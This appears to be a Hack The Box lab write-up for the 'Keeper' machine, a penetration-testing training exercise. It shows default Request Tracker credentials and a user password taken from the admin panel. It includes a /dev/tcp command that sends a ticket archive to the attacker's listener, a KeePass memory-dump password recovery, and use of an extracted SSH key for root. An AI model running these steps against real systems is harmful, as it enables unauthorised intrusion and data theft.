---
title: "HTB - Keeper"
date: 2026-04-12
platform: "HTB"
difficulty: "Easy"
tags: ["RequestTracker", "Default Credentials", "KeePass", "SSH Key Recovery"]
summary: "Exploiting default credentials in Request Tracker, then recovering a KeePass master password to extract an SSH private key for root access."
---

**Target IP:** `10.129.13.99`

## Enumeration

![Nmap scan results](1.png)

The scan reveals the following services:

- OpenSSH 8.9p1
- nginx 1.18.0
- Request Tracker 4.4.4+dfsg-2ubuntu1, accessible at `http://tickets.keeper.htb/rt/`

![Request Tracker login page](2.png)

The Request Tracker instance accepts the default credentials:

- **User:** `root`
- **Password:** `password`

## Foothold

Browsing the user administration panel at `http://tickets.keeper.htb/rt/Admin/Users/` reveals stored user credentials.

![Admin users panel](3.png)
![User credentials](4.png)

**Credentials obtained:**
- **User:** `lnorgaard`
- **Password:** `Welcome2023!`

## Privilege Escalation

A ticket attachment, `RT30000.zip`, is transferred from the target to the local machine for offline analysis:

On the target:
```bash
cat RT30000.zip > /dev/tcp/10.10.14.133/9001
```

On the attacking machine:
```bash
nc -lnvp 9001 > RT30000.zip
```

![Transferred archive contents](5.png)

The archive contains a KeePass database file. Its hash is extracted for offline cracking:

```bash
keepass2john passcodes.kdbx > keepasshash
```

Standard wordlist attacks fail, so the [keepass-password-dumper](https://github.com/vdohney/keepass-password-dumper) tool is used instead, which exploits a KeePass memory vulnerability to recover partial password fragments.

![KeePass password dumper output](6.png)

This reveals a potential password: `dgrød med fløde`. Testing it directly fails, and `kpcli` confirms no match.

A quick search clarifies the correct Danish spelling:

![Research on Danish phrase](7.png)

Trying the corrected version succeeds:

```
rødgrød med fløde
```
![Successful KeePass unlock](8.png)

Inside the database is an SSH private key. It is converted to OpenSSH format and used to authenticate as root:

```bash
puttygen ssh_key_file -O private-openssh -o id_rsa
```

Connecting with the converted key grants a root shell and access to the final flag.